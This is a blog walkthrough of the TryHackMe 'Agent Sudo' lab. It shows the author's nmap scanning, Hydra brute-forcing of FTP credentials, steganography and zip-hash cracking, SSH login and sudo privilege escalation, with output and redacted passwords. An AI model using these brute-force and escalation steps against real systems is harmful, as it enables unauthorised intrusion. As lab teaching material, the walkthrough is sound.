<!doctype html><html lang=en>
<head>
<meta charset=utf-8>
<meta name=viewport content="width=device-width,initial-scale=1">
<meta http-equiv=x-ua-compatible content="ie=edge">
<title>TryHackMe Agent Sudo | Classroom</title>
<link href=/img/avatar.jpeg rel="shortcut icon" type=image/x-icon>
<meta name=author content="Animesh Roy">
<meta name=description content="TryHackMe Room Agent Sudo, You found a secret server located under the deep sea. Your task is to hack inside the server and reveal the truth.">
<script data-ad-client=ca-pub-3526678290068011 async src=https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js></script>
<script data-ad-client=ca-pub-3526678290068011 async src=https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js></script>
<script async src="https://www.googletagmanager.com/gtag/js?id=G-NZBEX7RBNF"></script>
<script>window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag('js',new Date),gtag('config','G-NZBEX7RBNF')</script>
<script type=text/javascript>(function(a,e,b,f,g,c,d){a[b]=a[b]||function(){(a[b].q=a[b].q||[]).push(arguments)},c=e.createElement(f),c.async=1,c.src="https://www.clarity.ms/tag/"+g,d=e.getElementsByTagName(f)[0],d.parentNode.insertBefore(c,d)})(window,document,"clarity","script","6gp5990ghr")</script>
<link rel=canonical href=https://classroom.anir0y.in/post/tryhackme-agentsudoctf/>
<meta property="og:title" content="TryHackMe Agent Sudo">
<meta property="og:description" content="TryHackMe Room Agent Sudo, You found a secret server located under the deep sea. Your task is to hack inside the server and reveal the truth.">
<meta property="og:type" content="article">
<meta property="og:url" content="https://classroom.anir0y.in/post/tryhackme-agentsudoctf/"><meta property="article:section" content="post">
<meta property="article:published_time" content="2021-07-24T16:50:32+05:30">
<meta property="article:modified_time" content="2021-07-24T16:50:32+05:30">
<meta name=twitter:card content="summary">
<meta name=twitter:title content="TryHackMe Agent Sudo">
<meta name=twitter:description content="TryHackMe Room Agent Sudo, You found a secret server located under the deep sea. Your task is to hack inside the server and reveal the truth.">
<link rel=stylesheet href=/css/semantic.min.css>
<link rel=stylesheet href=/css/icomoon.css>
<link rel=stylesheet href=/css/OverlayScrollbars.min.css>
<link rel=stylesheet href=/css/github-markdown.css>
<link rel=stylesheet href=/css/site.css>
<link rel=stylesheet href=/css/custom.css>
<style>a:not(.ui.button):hover{text-decoration:underline}a:not(.ui.button){color:#2e8b57!important}.inverted a:not(.ui.button),.inverted a:not(.ui.button):hover{color:#8fbc8f!important}body.default{background-color:#fff}body.dark{background-color:#000}</style>
<link rel=stylesheet data-highlight href=https://cdn.jsdelivr.net/gh/highlightjs/cdn-release/build/styles/tomorrow.min.css>
<link rel=stylesheet href=/css/custom.css>
</head>
<body class=default>
<nav class="ui secondary menu dream-menu">
<div class=item>
<i class="large link bullseye icon dream-flip-toggle" title="Flip it!"></i>
</div>
<div class=item>
<i class="large link home icon" title=Home onclick="window.location.href='https://classroom.anir0y.in'"></i>
</div>
<div class=item>
<i class="large link icon theme-switch" onclick=themeSwitch()></i>
</div>
<div class=item>
<i class="large link search icon" onclick=toggleSearch()></i>
</div>
</nav>
<div class=flip-container>
<div class=flipper>
<section class=front>
<div class=dream-max-width>
<div class="ui relaxed grid dream-grid dream-grid-single" style=flex-direction:row-reverse>
<aside class="sixteen wide mobile sixteen wide tablet four wide computer column dream-single-aside">
<div class="ui segment toc">
<nav id=TableOfContents>
<ul>
<li><a href=#overview>OverView</a></li>
<li><a href=#task-01-author-note>Task 01: Author note</a></li>
<li><a href=#task-02enumerate>Task 02:Enumerate</a>
<ul>
<li><a href=#21-how-many-open-ports>2.1 How many open ports?</a></li>
<li><a href=#22-how-you-redirect-yourself-to-a-secret-page>2.2 How you redirect yourself to a secret page?</a></li>
<li><a href=#23-what-is-the-agent-name>2.3 What is the agent name?</a></li>
</ul>
</li>
<li><a href=#task-03-hash-cracking-and-brute-force>Task 03: Hash cracking and brute-force</a>
<ul>
<li><a href=#31-ftp-password>3.1: FTP password</a></li>
<li><a href=#32-zip-file-password>3.2 Zip file password</a></li>
<li><a href=#34-who-is-the-other-agent-in-full-name>3.4 Who is the other agent (in full name)?</a></li>
<li><a href=#35-ssh-password>3.5 SSH password</a></li>
</ul>
</li>
<li><a href=#task-04-capture-the-user-flag>Task 04: Capture the user flag</a>
<ul>
<li><a href=#41-what-is-the-user-flag>4.1 What is the user flag?</a></li>
<li><a href=#42-what-is-the-incident-of-the-photo-called>4.2 What is the incident of the photo called?</a></li>
</ul>
</li>
<li><a href=#task-05-privilege-escalation>Task 05: Privilege escalation</a>
<ul>
<li><a href=#51-cve-number-for-the-escalation-format-cve-xxxx-xxxx>5.1 CVE number for the escalation (Format: CVE-xxxx-xxxx)</a></li>
<li><a href=#53-root-the-box>5.3 [Root] the box</a></li>
</ul>
</li>
</ul>
</nav>
</div>
<div class="ui segment actions">
<button class="ui circular icon button save-as-image" title="Save as image" onclick=savePostAsImg()>
<i class="save icon"></i>
</button>
<a href="https://twitter.com/intent/tweet?text=TryHackMe%20Agent%20Sudo&url=https%3a%2f%2fclassroom.anir0y.in%2fpost%2ftryhackme-agentsudoctf%2f" class="ui circular twitter icon button">
<i class="twitter icon"></i>
</a>
<a href="https://facebook.com/sharer/sharer.php?u=https%3a%2f%2fclassroom.anir0y.in%2fpost%2ftryhackme-agentsudoctf%2f" class="ui circular facebook icon button">
<i class="facebook icon"></i>
</a>
</div>
</aside>
<div class="sixteen wide mobile sixteen wide tablet twelve wide computer column markdown-body dream-single" id=dream-save-post-as-img>
<section class="ui top attached segment">
<header>
<h1 class="ui large header">TryHackMe Agent Sudo<div class="sub header">
@
<a href=https://bit.ly/34sGFiK target=_blank>Animesh Roy</a>
|
Saturday, Jul 24, 2021
| 5 minutes read
| Update at
Saturday, Jul 24, 2021
</div>
</h1>
</header>
<article class=main><h2 id=overview>OverView</h2>
<table>
<thead>
<tr>
<th style=text-align:center></th>
<th></th>
</tr>
</thead>
<tbody>
<tr>
<td style=text-align:center><script src=https://tryhackme.com/badge/434937></script></td>
<td style=text-align:center><a class=twitter-follow-button href=https://twitter.com/anir0y data-size=large> Follow @anir0y<a></td>
</tr>
<tr>
<td style=text-align:center>Agent Sudo</td>
<td style=text-align:center><img src=https://tryhackme-images.s3.amazonaws.com/room-icons/aedc6b66c222e15ff740c282a0c3f44e.png alt=logo></td>
</tr>
<tr>
<td style=text-align:center><em>Room [Subscription Required]</em></td>
<td style=text-align:center><a href>Agent Sudo</a></td>
</tr>
</tbody>
</table>
<hr>
<h2 id=task-01-author-note>Task 01: Author note</h2>
<p>n/a</p>
<h2 id=task-02enumerate>Task 02:Enumerate</h2>
<ul>
<li>
<p>nmap</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>sudo nmap -sC -sV -oN init 10.10.245.114

Starting Nmap 7.60 <span style=color:#f92672>(</span> https://nmap.org <span style=color:#f92672>)</span> at 2021-07-25 19:49 BST
Nmap scan report <span style=color:#66d9ef>for</span> ip-10-10-245-114.eu-west-1.compute.internal <span style=color:#f92672>(</span>10.10.245.114<span style=color:#f92672>)</span>
Host is up <span style=color:#f92672>(</span>0.020s latency<span style=color:#f92672>)</span>.
Not shown: <span style=color:#ae81ff>921</span> closed ports, <span style=color:#ae81ff>76</span> filtered ports
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 <span style=color:#f92672>(</span>Ubuntu Linux; protocol 2.0<span style=color:#f92672>)</span>
| ssh-hostkey: 
|   <span style=color:#ae81ff>2048</span> ef:1f:5d:04:d4:77:95:06:60:72:ec:f0:58:f2:cc:07 <span style=color:#f92672>(</span>RSA<span style=color:#f92672>)</span>
|   <span style=color:#ae81ff>256</span> 5e:02:d1:9a:c4:e7:43:06:62:c1:9e:25:84:8a:e7:ea <span style=color:#f92672>(</span>ECDSA<span style=color:#f92672>)</span>
|_  <span style=color:#ae81ff>256</span> 2d:00:5c:b9:fd:a8:c8:d8:80:e3:92:4f:8b:4f:18:e2 <span style=color:#f92672>(</span>EdDSA<span style=color:#f92672>)</span>
80/tcp open  http    Apache httpd 2.4.29 <span style=color:#f92672>((</span>Ubuntu<span style=color:#f92672>))</span>
|_http-server-header: Apache/2.4.29 <span style=color:#f92672>(</span>Ubuntu<span style=color:#f92672>)</span>
|_http-title: Annoucement
MAC Address: 02:C4:A2:7C:B0:5B <span style=color:#f92672>(</span>Unknown<span style=color:#f92672>)</span>
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap <span style=color:#66d9ef>done</span>: <span style=color:#ae81ff>1</span> IP address <span style=color:#f92672>(</span><span style=color:#ae81ff>1</span> host up<span style=color:#f92672>)</span> scanned in 13.23 seconds
</code></pre></div></li>
</ul>
<h3 id=21-how-many-open-ports>2.1 How many open ports?</h3>
<p>ans: <code>3</code></p>
<h3 id=22-how-you-redirect-yourself-to-a-secret-page>2.2 How you redirect yourself to a secret page?</h3>
<p>ans: <code>user-agent</code></p>
<h3 id=23-what-is-the-agent-name>2.3 What is the agent name?</h3>
<ul>
<li>run <code>CURL</code> to find out
<code>curl -H user-agent:C http://10.10.245.114/agent_C_attention.php</code></li>
</ul>
<hr>
<script async src=https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js></script>
<p><ins class=adsbygoogle style=display:block;text-align:center data-ad-layout=in-article data-ad-format=fluid data-ad-client=ca-pub-3526678290068011 data-ad-slot=7160066188></ins></p>
<script>(adsbygoogle=window.adsbygoogle||[]).push({})</script>
<hr>
<h2 id=task-03-hash-cracking-and-brute-force>Task 03: Hash cracking and brute-force</h2>
<blockquote>
<p>Done enumerate the machine? Time to brute your way out.</p>
</blockquote>
<h3 id=31-ftp-password>3.1: FTP password</h3>
<ul>
<li>
<p>running <code>Hydra</code></p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>hydra -l chris -P /usr/share/wordlists/rockyou.txt 10.10.245.114 -t <span style=color:#ae81ff>4</span> ftp
Hydra v8.6 <span style=color:#f92672>(</span>c<span style=color:#f92672>)</span> <span style=color:#ae81ff>2017</span> by van Hauser/THC - Please <span style=color:#66d9ef>do</span> not use in military or secret service organizations, or <span style=color:#66d9ef>for</span> illegal purposes.

Hydra <span style=color:#f92672>(</span>http://www.thc.org/thc-hydra<span style=color:#f92672>)</span> starting at 2021-07-25 19:57:23
<span style=color:#f92672>[</span>DATA<span style=color:#f92672>]</span> max <span style=color:#ae81ff>4</span> tasks per <span style=color:#ae81ff>1</span> server, overall <span style=color:#ae81ff>4</span> tasks, <span style=color:#ae81ff>14344398</span> login tries <span style=color:#f92672>(</span>l:1/p:14344398<span style=color:#f92672>)</span>, ~3586100 tries per task
<span style=color:#f92672>[</span>DATA<span style=color:#f92672>]</span> attacking ftp://10.10.245.114:21/

...<span style=color:#f92672>[</span>snip<span style=color:#f92672>]</span>...
<span style=color:#f92672>[</span>21<span style=color:#f92672>][</span>ftp<span style=color:#f92672>]</span> host: 10.10.245.114   login: chris   password: <span style=color:#f92672>[</span>*******<span style=color:#f92672>]</span>
<span style=color:#ae81ff>1</span> of <span style=color:#ae81ff>1</span> target successfully completed, <span style=color:#ae81ff>1</span> valid password found
Hydra <span style=color:#f92672>(</span>http://www.thc.org/thc-hydra<span style=color:#f92672>)</span> finished at 2021-07-25 20:01:09

...<span style=color:#f92672>[</span>snip<span style=color:#f92672>]</span>...
</code></pre></div></li>
</ul>
<h3 id=32-zip-file-password>3.2 Zip file password</h3>
<ul>
<li>
<p>download all files from <code>ftp</code></p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>ftp 10.10.245.114 
Connected to 10.10.245.114.
<span style=color:#ae81ff>220</span> <span style=color:#f92672>(</span>vsFTPd 3.0.3<span style=color:#f92672>)</span>
Name <span style=color:#f92672>(</span>10.10.245.114:root<span style=color:#f92672>)</span>: chris
<span style=color:#ae81ff>331</span> Please specify the password.
Password:
<span style=color:#ae81ff>230</span> Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp&gt; dir
<span style=color:#ae81ff>200</span> PORT command successful. Consider using PASV.
<span style=color:#ae81ff>150</span> Here comes the directory listing.
-rw-r--r--    <span style=color:#ae81ff>1</span> <span style=color:#ae81ff>0</span>        <span style=color:#ae81ff>0</span>             <span style=color:#ae81ff>217</span> Oct <span style=color:#ae81ff>29</span>  <span style=color:#ae81ff>2019</span> To_agentJ.txt
-rw-r--r--    <span style=color:#ae81ff>1</span> <span style=color:#ae81ff>0</span>        <span style=color:#ae81ff>0</span>           <span style=color:#ae81ff>33143</span> Oct <span style=color:#ae81ff>29</span>  <span style=color:#ae81ff>2019</span> cute-alien.jpg
-rw-r--r--    <span style=color:#ae81ff>1</span> <span style=color:#ae81ff>0</span>        <span style=color:#ae81ff>0</span>           <span style=color:#ae81ff>34842</span> Oct <span style=color:#ae81ff>29</span>  <span style=color:#ae81ff>2019</span> cutie.png

ftp&gt; mget -r *
</code></pre></div></li>
<li>
<p>read the <code>To_agentJ.txt</code> file.</p>
<pre><code class=language-cat data-lang=cat>cat To_agentJ.txt
Dear agent J,

All these alien like photos are fake! Agent R stored the real picture inside your directory. Your login password is somehow stored in the fake picture. It shouldn't be a problem for you.

From,
Agent C
</code></pre></li>
<li>
<p>It says that the login password is in the fake pic&rsquo;s. This clearly indicates to use of Steganography. using steghide we see that we need a passphrase to extract info from <code>cute-alien.jpg</code> , this password must be hidden in <code>cutie.png</code> . we use binwalk for this.</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>binwalk -e cutie.png 

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
<span style=color:#ae81ff>0</span>             0x0             PNG image, <span style=color:#ae81ff>528</span> x 528, 8-bit colormap, non-interlaced
<span style=color:#ae81ff>869</span>           0x365           Zlib compressed data, best compression
<span style=color:#ae81ff>34562</span>         0x8702          Zip archive data, encrypted compressed size: 98, uncompressed size: 86, name: To_agentR.txt
<span style=color:#ae81ff>34820</span>         0x8804          End of Zip archive
</code></pre></div></li>
<li>
<p>Zip2John</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>
<span style=color:#75715e>#1 get the Crackable Hash</span>
zip2john 8702.zip  &gt; zip_hash

<span style=color:#75715e>#2: crack the Hash</span>

john --wordlist<span style=color:#f92672>=</span>/usr/share/wordlists/rockyou.txt zip_hash 
Warning: detected hash type <span style=color:#e6db74>&#34;ZIP&#34;</span>, but the string is also recognized as <span style=color:#e6db74>&#34;ZIP-opencl&#34;</span>
Use the <span style=color:#e6db74>&#34;--format=ZIP-opencl&#34;</span> option to force loading these as that type instead
Using default input encoding: UTF-8
Loaded <span style=color:#ae81ff>1</span> password hash <span style=color:#f92672>(</span>ZIP, WinZip <span style=color:#f92672>[</span>PBKDF2-SHA1 256/256 AVX2 8x<span style=color:#f92672>])</span>
Will run <span style=color:#ae81ff>2</span> OpenMP threads
Press <span style=color:#e6db74>&#39;q&#39;</span> or Ctrl-C to abort, almost any other key <span style=color:#66d9ef>for</span> status
<span style=color:#f92672>[</span>*****<span style=color:#f92672>]</span>            <span style=color:#f92672>(</span>8702.zip/To_agentR.txt<span style=color:#f92672>)</span>
1g 0:00:00:00 DONE <span style=color:#f92672>(</span>2021-07-25 20:14<span style=color:#f92672>)</span> 1.333g/s 32768p/s 32768c/s 32768C/s merlina..280690
Use the <span style=color:#e6db74>&#34;--show&#34;</span> option to display all of the cracked passwords reliably
Session completed.
</code></pre></div></li>
</ul>
<h4 id=33-steg-password>3.3 steg password</h4>
<ul>
<li>
<p>steps</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>
<span style=color:#75715e>#1 unzip the `zip`</span>


<span style=color:#75715e># read the content</span>
Agent C,

We need to send the picture to <span style=color:#e6db74>&#39;QXJlYTUx&#39;</span> as soon as possible!

By,
Agent R

<span style=color:#75715e>#3 flag</span>

echo QXJlYTUx | bas364 -d
</code></pre></div></li>
</ul>
<h3 id=34-who-is-the-other-agent-in-full-name>3.4 Who is the other agent (in full name)?</h3>
<h3 id=35-ssh-password>3.5 SSH password</h3>
<ul>
<li>
<p>read the <code>encoded image</code></p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>steghide extract -sf cute-alien.jpg
Enter passphrase: 
wrote extracted data to <span style=color:#e6db74>&#34;message.txt&#34;</span>.
</code></pre></div></li>
<li>
<p>after extraction you&rsquo;ll get this message:</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>cat message.txt 
Hi <span style=color:#f92672>[</span>username-was-here<span style=color:#f92672>]</span>,

Glad you find this message. Your login password is <span style=color:#f92672>[</span>password-was-here<span style=color:#f92672>]</span>

Don<span style=color:#960050;background-color:#1e0010>&#39;</span>t ask me why the password look cheesy, ask agent R who set this password <span style=color:#66d9ef>for</span> you.

Your buddy,
chris
</code></pre></div></li>
</ul>
<hr>
<script async src=https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js></script>
<p><ins class=adsbygoogle style=display:block;text-align:center data-ad-layout=in-article data-ad-format=fluid data-ad-client=ca-pub-3526678290068011 data-ad-slot=7160066188></ins></p>
<script>(adsbygoogle=window.adsbygoogle||[]).push({})</script>
<hr>
<h2 id=task-04-capture-the-user-flag>Task 04: Capture the user flag</h2>
<ul>
<li>
<p>getinto the box using the creds.</p>
<pre><code class=language-ssh data-lang=ssh>ssh james@10.10.245.114
james@10.10.245.114's password: 
Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 4.15.0-55-generic x86_64)
</code></pre></li>
</ul>
<h3 id=41-what-is-the-user-flag>4.1 What is the user flag?</h3>
<ul>
<li>
<p>read the file</p>
<p><img src=https://i.imgur.com/xY5vy2l.png alt=img></p>
</li>
</ul>
<h3 id=42-what-is-the-incident-of-the-photo-called>4.2 What is the incident of the photo called?</h3>
<ul>
<li>
<p>copy photo to local machine</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>scp james@10.10.245.114:Alien_autospy.jpg .
</code></pre></div></li>
<li>
<p>do a reverse image search with the image</p>
<p><img src=https://i.imgur.com/2wasC3q.png alt=img></p>
</li>
<li>
<p>Hint <a href=https://www.foxnews.com/science/filmmaker-reveals-how-he-faked-infamous-roswell-alien-autopsy-footage-in-a-london-apartment>link</a></p>
</li>
</ul>
<hr>
<script async src=https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js></script>
<p><ins class=adsbygoogle style=display:block;text-align:center data-ad-layout=in-article data-ad-format=fluid data-ad-client=ca-pub-3526678290068011 data-ad-slot=7160066188></ins></p>
<script>(adsbygoogle=window.adsbygoogle||[]).push({})</script>
<hr>
<h2 id=task-05-privilege-escalation>Task 05: Privilege escalation</h2>
<h3 id=51-cve-number-for-the-escalation-format-cve-xxxx-xxxx>5.1 CVE number for the escalation (Format: CVE-xxxx-xxxx)</h3>
<ul>
<li>
<p>check for SUDO version & search for the SSH Version</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>james@agent-sudo:~$ sudo -l
<span style=color:#f92672>[</span>sudo<span style=color:#f92672>]</span> password <span style=color:#66d9ef>for</span> james: 
Matching Defaults entries <span style=color:#66d9ef>for</span> james on agent-sudo:
env_reset, mail_badpass, secure_path<span style=color:#f92672>=</span>/usr/local/sbin<span style=color:#ae81ff>\:</span>/usr/local/bin<span style=color:#ae81ff>\:</span>/usr/sbin<span style=color:#ae81ff>\:</span>/usr/bin<span style=color:#ae81ff>\:</span>/sbin<span style=color:#ae81ff>\:</span>/bin<span style=color:#ae81ff>\:</span>/snap/bin

User james may run the following commands on agent-sudo:
<span style=color:#f92672>(</span>ALL, !root<span style=color:#f92672>)</span> /bin/bash
</code></pre></div></li>
<li>
<p>vulnerable <code>sudo</code> version CVE</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=color:#75715e>#find Sudo version</span>
james@agent-sudo:~$ sudo -V
Sudo version 1.8.21p2
Sudoers policy plugin version 1.8.21p2
Sudoers file grammar version <span style=color:#ae81ff>46</span>
Sudoers I/O plugin version 1.8.21p2
</code></pre></div></li>
<li>
<p>Hint: <a href=https://www.exploit-db.com/exploits/47502>link</a></p>
</li>
</ul>
<h3 id=53-root-the-box>5.3 [Root] the box</h3>
<ul>
<li>
<p>run the Exploit</p>
</li>
<li>
<p>being root read the file</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>cat /root/root.txt 
To Mr.hacker,

Congratulation on rooting this box. This box was designed <span style=color:#66d9ef>for</span> TryHackMe. Tips, always update your machine. 

Your flag is 
<span style=color:#f92672>[</span>flag-was-here<span style=color:#f92672>]</span>

By,
<span style=color:#f92672>[</span>agent-R-real-name<span style=color:#f92672>]</span> a.k.a Agent R
</code></pre></div></li>
</ul>
<hr>
<script async src=https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js></script>
<p><ins class=adsbygoogle style=display:block;text-align:center data-ad-layout=in-article data-ad-format=fluid data-ad-client=ca-pub-3526678290068011 data-ad-slot=7160066188></ins></p>
<script>(adsbygoogle=window.adsbygoogle||[]).push({})</script>
<script data-name=BMC-Widget data-cfasync=false src=https://cdnjs.buymeacoffee.com/1.0.0/widget.prod.min.js data-id=anir0y data-description="Support me on Buy me a coffee!" data-message data-color=#5F7FFF data-position=Right data-x_margin=18 data-y_margin=18></script>
</article>
</section>
</div>
</div>
<footer class="ui basic center aligned segment" style=background-color:transparent>
<p>Â© 2010 - 2021 Classroom</p>
</footer>
</div>
</section>
<section class=back>
<div class=dream-max-width>
<header class="ui basic very padded segment dream-header">
<div class="ui small circular image">
<img src=/img/avatar.jpeg>
</div>
<div class=content>
<h1 class="ui medium header">Classroom Notes & Blog Posts<div class="sub header"></div>
</h1>
<article class="ui horizontal list">
<a class=item href=/categories>
<i class="th list icon" title="All Categories"></i>
</a>
<a class=item href=/tags>
<i class="tags icon" title="All Tags"></i>
</a>
</article>
<article class=dream-tags>
<a class="ui label" href=/tags/agent-sudo/ title="Agent Sudo">
Agent Sudo
</a>
<a class="ui label" href=/tags/autopsy/ title=autopsy>
autopsy
</a>
<a class="ui label" href=/tags/backdoor/ title=backdoor>
backdoor
</a>
<a class="ui label" href=/tags/baron-samedit/ title="Baron Samedit">
Baron Samedit
</a>
<a class="ui label" href=/tags/bash/ title=bash>
bash
</a>
<a class="ui label" href=/tags/cheatsheet/ title=cheatsheet>
cheatsheet
</a>
<a class="ui label" href=/tags/config/ title=config>
config
</a>
<a class="ui label" href=/tags/couch/ title=couch>
couch
</a>
<a class="ui label" href=/tags/crisis/ title=Crisis>
Crisis
</a>
<a class="ui label" href=/tags/dominos/ title=dominos>
dominos
</a>
<a class="ui label" href=/tags/empire/ title=Empire>
Empire
</a>
<a class="ui label" href=/tags/encryption/ title=encryption>
encryption
</a>
<a class="ui label" href=/tags/ffuf/ title=ffuf>
ffuf
</a>
<a class="ui label" href=/tags/forensic/ title=forensic>
forensic
</a>
<a class="ui label" href=/tags/gitandcrumpets/ title=gitandcrumpets>
gitandcrumpets
</a>
<a class="ui label" href=/tags/gnupg/ title=gnupg>
gnupg
</a>
<a class="ui label" href=/tags/hackpark/ title=HackPark>
HackPark
</a>
<a class="ui label" href=/tags/hydra/ title=hydra>
hydra
</a>
<a class="ui label" href=/tags/inclusion/ title=inclusion>
inclusion
</a>
<a class="ui label" href=/tags/internship/ title=Internship>
Internship
</a>
<a class="ui label" href=/tags/interview/ title=interview>
interview
</a>
<a class="ui label" href=/tags/kenobi/ title=kenobi>
kenobi
</a>
<a class="ui label" href=/tags/lab/ title=lab>
lab
</a>
<a class="ui label" href=/tags/leaks/ title=leaks>
leaks
</a>
<a class="ui label" href=/tags/linux/ title=Linux>
Linux
</a>
<a class="ui label" href=/tags/memory/ title=memory>
memory
</a>
<a class="ui label" href=/tags/metamorphosis/ title=Metamorphosis>
Metamorphosis
</a>
<a class="ui label" href=/tags/metasploit/ title=metasploit>
metasploit
</a>
<a class="ui label" href=/tags/mobile/ title=Mobile>
Mobile
</a>
<a class="ui label" href=/tags/msf/ title=msf>
msf
</a>
<a class="ui label" href=/tags/msfvenom/ title=msfvenom>
msfvenom
</a>
<a class="ui label" href=/tags/notes/ title=notes>
notes
</a>
<a class="ui label" href=/tags/osi/ title=OSI>
OSI
</a>
<a class="ui label" href=/tags/osi-model/ title="OSI Model">
OSI Model
</a>
<a class="ui label" href=/tags/overpass-2/ title="Overpass 2">
Overpass 2
</a>
<a class="ui label" href=/tags/pentesting/ title=Pentesting>
Pentesting
</a>
<a class="ui label" href=/tags/pgp/ title=PGP>
PGP
</a>
<a class="ui label" href=/tags/pip/ title=pip>
pip
</a>
<a class="ui label" href=/tags/pip2/ title=pip2>
pip2
</a>
<a class="ui label" href=/tags/post-exploitation/ title=Post-Exploitation>
Post-Exploitation
</a>
<a class="ui label" href=/tags/powershell/ title=powershell>
powershell
</a>
<a class="ui label" href=/tags/putty/ title=putty>
putty
</a>
<a class="ui label" href=/tags/python/ title=python>
python
</a>
<a class="ui label" href=/tags/razorblack/ title=RazorBlack>
RazorBlack
</a>
<a class="ui label" href=/tags/redteaming/ title=redteaming>
redteaming
</a>
<a class="ui label" href=/tags/ref/ title=Ref>
Ref
</a>
<a class="ui label" href=/tags/relevant/ title=Relevant>
Relevant
</a>
<a class="ui label" href=/tags/rooms/ title=rooms>
rooms
</a>
<a class="ui label" href=/tags/rootme/ title=RootMe>
RootMe
</a>
<a class="ui label" href=/tags/rpwebscanning/ title=rpwebscanning>
rpwebscanning
</a>
<a class="ui label" href=/tags/script/ title=script>
script
</a>
<a class="ui label" href=/tags/scripting/ title=Scripting>
Scripting
</a>
<a class="ui label" href=/tags/simple-ctf/ title="Simple CTF">
Simple CTF
</a>
<a class="ui label" href=/tags/splunk/ title=splunk>
splunk
</a>
<a class="ui label" href=/tags/stego/ title=stego>
stego
</a>
<a class="ui label" href=/tags/sweettoothinc/ title=sweettoothinc>
sweettoothinc
</a>
<a class="ui label" href=/tags/sysmon/ title=sysmon>
sysmon
</a>
<a class="ui label" href=/tags/thefindcommand/ title=Thefindcommand>
Thefindcommand
</a>
<a class="ui label" href=/tags/thm/ title=thm>
thm
</a>
<a class="ui label" href=/tags/tmux/ title=tmux>
tmux
</a>
<a class="ui label" href=/tags/tools/ title=tools>
tools
</a>
<a class="ui label" href=/tags/tryhackme/ title=tryhackme>
tryhackme
</a>
<a class="ui label" href=/tags/vapt/ title=vapt>
vapt
</a>
<a class="ui label" href=/tags/volatility/ title=Volatility>
Volatility
</a>
<a class="ui label" href=/tags/vuln-labs/ title="vuln labs">
vuln labs
</a>
<a class="ui label" href=/tags/vulnversity/ title=Vulnversity>
Vulnversity
</a>
<a class="ui label" href=/tags/web-scanning/ title="web scanning">
web scanning
</a>
<a class="ui label" href=/tags/wireshark/ title=wireshark>
wireshark
</a>
</article>
</div>
</header>
<div class="ui relaxed grid dream-grid dream-back">
<div class="sixteen wide mobile eight wide tablet four wide computer column dream-column">
<article class="ui segment">
<h3 class="ui header">Social Links</h3>
<nav class="ui secondary menu dream-menu dream-socials">
<div class=item>
<a href=/index.xml>
<i class="large rss square icon" title=RSS></i>
</a>
</div>
<div class=item>
<a href=mailto:classroom@anir0y.in>
<i class="large mail icon" title=Email></i>
</a>
</div>
<div class=item>
<a href=https://twitter.com/anir0y target=_blank>
<i class="large twitter icon" title=Twitter></i>
</a>
</div>
<div class=item>
<a href=https://facebook.com/anir0yofficial target=_blank>
<i class="large facebook icon" title=Facebook></i>
</a>
</div>
<div class=item>
<a href=https://instagram.com/anir0yofficial target=_blank>
<i class="large instagram icon" title=Instagram></i>
</a>
</div>
<div class=item>
<a href=https://www.linkedin.com/in/anir0y target=_blank>
<i class="large linkedin icon" title=Linkedin></i>
</a>
</div>
<div class=item>
<a href=https://github.com/anir0y target=_blank>
<i class="large github icon" title=GitHub></i>
</a>
</div>
</nav>
</article>
</div>
<div class="sixteen wide mobile eight wide tablet four wide computer column dream-column">
<article class="ui segment">
YOU CAN RESUE MY CONTENT
</article>
</div>
</div>
</div>
</section>
</div>
</div>
<script>window.defaultDark=null,window.backgroundDark="black",window.backgroundImageDark=null,window.darkNav=!0,window.hasTwitterEmbed=!0,window.hasTwitterEmbed&&(window.twttr=function(c,d,e){var b,f=c.getElementsByTagName(d)[0],a=window.twttr||{};return c.getElementById(e)?a:(b=c.createElement(d),b.id=e,b.src='https://platform.twitter.com/widgets.js',f.parentNode.insertBefore(b,f),a._e=[],a.ready=function(b){a._e.push(b)},a)}(document,'script','twitter-wjs'))</script>
<script src=/js/jquery.min.js></script>
